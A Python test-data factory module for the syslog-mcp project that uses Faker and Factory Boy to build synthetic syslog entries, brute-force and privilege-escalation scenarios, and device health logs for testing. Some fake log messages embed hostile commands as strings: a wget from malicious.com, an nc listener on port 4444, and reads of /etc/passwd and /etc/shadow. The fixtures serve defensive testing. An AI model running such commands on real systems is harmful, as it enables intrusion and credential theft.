"""
Data factories for generating realistic test data for syslog-mcp tests.

These factories use Faker and Factory Boy to generate authentic syslog entries,
device data, and security scenarios for comprehensive testing.
"""

import random
from datetime import datetime, timedelta, timezone
from typing import Any, Dict, List

import factory
from faker import Faker
from faker.providers import BaseProvider

from syslog_mcp.models.log_entry import LogLevel

fake = Faker()


class SyslogProvider(BaseProvider):
    """Custom Faker provider for syslog-specific data."""
    
    # Common syslog programs/services
    PROGRAMS = [
        "sshd", "sudo", "kernel", "systemd", "nginx", "apache2", "postfix",
        "dovecot", "cron", "dhclient", "NetworkManager", "firewalld", "named",
        "vsftpd", "smbd", "nmbd", "mysqld", "postgresql", "redis-server",
        "elasticsearch", "docker", "containerd", "kubelet"
    ]
    
    # Common facilities
    FACILITIES = [
        "auth", "authpriv", "daemon", "kern", "mail", "news", "syslog",
        "user", "uucp", "cron", "local0", "local1", "local2", "local3",
        "local4", "local5", "local6", "local7"
    ]
    
    # Device naming patterns
    DEVICE_PREFIXES = [
        "server", "router", "switch", "firewall", "proxy", "web", "db",
        "app", "mail", "dns", "dhcp", "jump", "bastion", "worker", "master"
    ]
    
    # Security-related message patterns
    SECURITY_MESSAGES = [
        "Failed password for {user} from {ip} port {port}",
        "Invalid user {user} from {ip} port {port}",
        "authentication failure; logname= uid=0 euid=0 tty= ruser= rhost={ip} user={user}",
        "Accepted password for {user} from {ip} port {port}",
        "sudo: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={command}",
        "Connection closed by authenticating user {user} {ip} port {port}",
        "Disconnected from authenticating user {user} {ip} port {port}",
        "pam_unix(sudo:session): session opened for user root by {user}(uid=1000)",
        "pam_unix(sudo:session): session closed for user root",
        "Failed to authenticate user {user} via ssh from {ip}",
        "Brute force attack detected from {ip}: {attempts} failed attempts"
    ]
    
    # System messages
    SYSTEM_MESSAGES = [
        "systemd[1]: Started {service}",
        "systemd[1]: Stopped {service}",
        "systemd[1]: {service} failed with result 'exit-code'",
        "kernel: Out of memory: Kill process {pid} ({process}) score {score}",
        "kernel: TCP: time wait bucket table overflow",
        "kernel: CPU{cpu}: Core temperature above threshold",
        "disk usage on / is {usage}%",
        "Memory usage: {usage}% ({used}MB used of {total}MB)",
        "Load average: {load1} {load5} {load15}",
        "Network interface {interface} is down",
        "Network interface {interface} is up"
    ]
    
    def syslog_program(self) -> str:
        """Generate a realistic syslog program name."""
        return self.random_element(self.PROGRAMS)
    
    def syslog_facility(self) -> str:
        """Generate a realistic syslog facility."""
        return self.random_element(self.FACILITIES)
    
    def device_name(self) -> str:
        """Generate a realistic device name."""
        prefix = self.random_element(self.DEVICE_PREFIXES)
        suffix = self.random_int(min=1, max=99, step=1)
        return f"{prefix}-{suffix:02d}"
    
    def security_message(self) -> str:
        """Generate a realistic security-related log message."""
        template = self.random_element(self.SECURITY_MESSAGES)
        return template.format(
            user=fake.user_name(),
            ip=fake.ipv4(),
            port=fake.port_number(),
            command=fake.random_element([
                "/usr/bin/apt update", "/bin/ls -la", "/usr/bin/systemctl status nginx",
                "/bin/cat /etc/passwd", "/usr/bin/wget http://malicious.com/script.sh",
                "/bin/chmod +x malware", "/usr/bin/nc -l 4444"
            ]),
            attempts=fake.random_int(min=5, max=50),
            service=fake.random_element([
                "nginx.service", "apache2.service", "mysql.service", 
                "postgresql.service", "redis.service"
            ]),
            pid=fake.random_int(min=100, max=99999),
            process=fake.random_element([
                "nginx", "apache2", "mysql", "python", "node", "java"
            ]),
            score=fake.random_int(min=100, max=1000),
            cpu=fake.random_int(min=0, max=7),
            usage=fake.random_int(min=60, max=95),
            used=fake.random_int(min=1000, max=8000),
            total=fake.random_int(min=8000, max=32000),
            load1=fake.pyfloat(min_value=0.1, max_value=8.0, right_digits=2),
            load5=fake.pyfloat(min_value=0.1, max_value=6.0, right_digits=2),
            load15=fake.pyfloat(min_value=0.1, max_value=4.0, right_digits=2),
            interface=fake.random_element(["eth0", "eth1", "wlan0", "ens18", "enp0s3"])
        )
    
    def system_message(self) -> str:
        """Generate a realistic system log message."""
        template = self.random_element(self.SYSTEM_MESSAGES)
        return template.format(
            service=fake.random_element([
                "nginx.service", "apache2.service", "mysql.service"
            ]),
            pid=fake.random_int(min=100, max=99999),
            process=fake.random_element([
                "nginx", "apache2", "mysql", "python", "node"
            ]),
            score=fake.random_int(min=100, max=1000),
            cpu=fake.random_int(min=0, max=7),
            usage=fake.random_int(min=60, max=95),
            used=fake.random_int(min=1000, max=8000),
            total=fake.random_int(min=8000, max=32000),
            load1=fake.pyfloat(min_value=0.1, max_value=8.0, right_digits=2),
            load5=fake.pyfloat(min_value=0.1, max_value=6.0, right_digits=2),
            load15=fake.pyfloat(min_value=0.1, max_value=4.0, right_digits=2),
            interface=fake.random_element(["eth0", "eth1", "wlan0"])
        )

# Register the custom provider
fake.add_provider(SyslogProvider)


class LogEntryFactory(factory.Factory):
    """Factory for generating realistic log entries."""
    
    class Meta:
        model = dict  # Generate dict objects compatible with Elasticsearch
    
    timestamp = factory.LazyFunction(
        lambda: (
            datetime.now(timezone.utc) - timedelta(
                minutes=random.randint(0, 10080)  # Within last week
            )
        ).isoformat()
    )
    
    device = factory.LazyFunction(lambda: fake.device_name())
    message = factory.LazyFunction(lambda: fake.security_message())
    program = factory.LazyFunction(lambda: fake.syslog_program())
    level = factory.LazyFunction(lambda: random.choice(list(LogLevel)))
    facility = factory.LazyFunction(lambda: fake.syslog_facility())
    
    # Additional fields for testing
    host = factory.SelfAttribute('device')  # Alias for device
    severity = factory.LazyAttribute(lambda obj: obj.level.value if hasattr(obj.level, 'value') else obj.level)


class SecurityLogFactory(LogEntryFactory):
    """Factory for security-focused log entries."""
    
    program = factory.Iterator(["sshd", "sudo", "su", "auth", "pam"])
    facility = factory.Iterator(["auth", "authpriv", "security"])
    level = factory.Iterator([LogLevel.WARNING, LogLevel.ERROR, LogLevel.CRITICAL])
    message = factory.LazyFunction(lambda: fake.security_message())


class SystemLogFactory(LogEntryFactory):
    """Factory for system-focused log entries."""
    
    program = factory.Iterator(["systemd", "kernel", "NetworkManager", "cron"])
    facility = factory.Iterator(["daemon", "kern", "cron", "syslog"])
    level = factory.Iterator([LogLevel.INFO, LogLevel.WARN, LogLevel.WARNING])
    message = factory.LazyFunction(lambda: fake.system_message())


class BruteForceAttackFactory(factory.Factory):
    """Factory for generating brute force attack scenarios."""
    
    class Meta:
        model = dict
    
    attacker_ip = factory.LazyFunction(lambda: fake.ipv4())
    target_device = factory.LazyFunction(lambda: fake.device_name())
    attempts = factory.LazyFunction(lambda: random.randint(10, 100))
    
    @factory.post_generation
    def create_log_entries(self, create, extracted, **kwargs):
        """Generate a series of failed auth attempts from the same IP."""
        if not create:
            return []
        
        entries = []
        base_time = datetime.now(timezone.utc) - timedelta(minutes=30)
        
        for i in range(self.attempts):
            timestamp = base_time + timedelta(seconds=random.randint(1, 60) * i)
            entry = {
                "timestamp": timestamp.isoformat(),
                "device": self.target_device,
                "program": "sshd",
                "facility": "auth",
                "level": LogLevel.WARNING.value,
                "message": f"Failed password for {fake.user_name()} from {self.attacker_ip} port {fake.port_number()}"
            }
            entries.append(entry)
        
        return entries


class DeviceHealthScenarioFactory(factory.Factory):
    """Factory for generating device health scenarios."""
    
    class Meta:
        model = dict
    
    device_name = factory.LazyFunction(lambda: fake.device_name())
    scenario_type = factory.Iterator([
        "disk_full", "high_cpu", "memory_leak", "network_down", "service_crash"
    ])
    
    @factory.post_generation
    def create_log_entries(self, create, extracted, **kwargs):
        """Generate logs for the health scenario."""
        if not create:
            return []
        
        entries = []
        base_time = datetime.now(timezone.utc) - timedelta(hours=2)
        
        if self.scenario_type == "disk_full":
            for i in range(20):
                timestamp = base_time + timedelta(minutes=i * 5)
                usage = min(95, 75 + i * 2)  # Gradually increasing
                entry = {
                    "timestamp": timestamp.isoformat(),
                    "device": self.device_name,
                    "program": "systemd",
                    "facility": "daemon",
                    "level": LogLevel.WARNING.value if usage < 90 else LogLevel.ERROR.value,
                    "message": f"disk usage on / is {usage}%"
                }
                entries.append(entry)
        
        elif self.scenario_type == "high_cpu":
            for i in range(30):
                timestamp = base_time + timedelta(minutes=i * 2)
                load = round(random.uniform(4.0, 8.0), 2)
                entry = {
                    "timestamp": timestamp.isoformat(),
                    "device": self.device_name,
                    "program": "kernel",
                    "facility": "kern",
                    "level": LogLevel.WARNING.value,
                    "message": f"Load average: {load} {load * 0.8:.2f} {load * 0.6:.2f}"
                }
                entries.append(entry)
        
        # Add more scenarios as needed
        
        return entries


def create_elasticsearch_bulk_data(num_entries: int = 1000) -> List[Dict[str, Any]]:
    """Create bulk data for Elasticsearch indexing in tests."""
    entries = []
    
    # Mix of different log types
    for _ in range(int(num_entries * 0.6)):  # 60% normal logs
        entries.append(LogEntryFactory())
    
    for _ in range(int(num_entries * 0.3)):  # 30% security logs
        entries.append(SecurityLogFactory())
    
    for _ in range(int(num_entries * 0.1)):  # 10% system logs
        entries.append(SystemLogFactory())
    
    return entries


def create_security_scenario() -> List[Dict[str, Any]]:
    """Create a complex security scenario with multiple attack patterns."""
    entries = []
    
    # Brute force attack
    brute_force = BruteForceAttackFactory()
    entries.extend(brute_force.create_log_entries(True))
    
    # Privilege escalation attempt
    escalation_time = datetime.now(timezone.utc) - timedelta(minutes=10)
    escalation_entries = [
        {
            "timestamp": (escalation_time + timedelta(seconds=i * 30)).isoformat(),
            "device": "server-01",
            "program": "sudo",
            "facility": "auth",
            "level": LogLevel.WARNING.value,
            "message": f"sudo: {fake.user_name()} : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cat /etc/shadow"
        } for i in range(5)
    ]
    entries.extend(escalation_entries)
    
    return entries


def create_device_health_scenario() -> List[Dict[str, Any]]:
    """Create a device health degradation scenario."""
    scenario = DeviceHealthScenarioFactory(scenario_type="disk_full")
    return scenario.create_log_entries(True)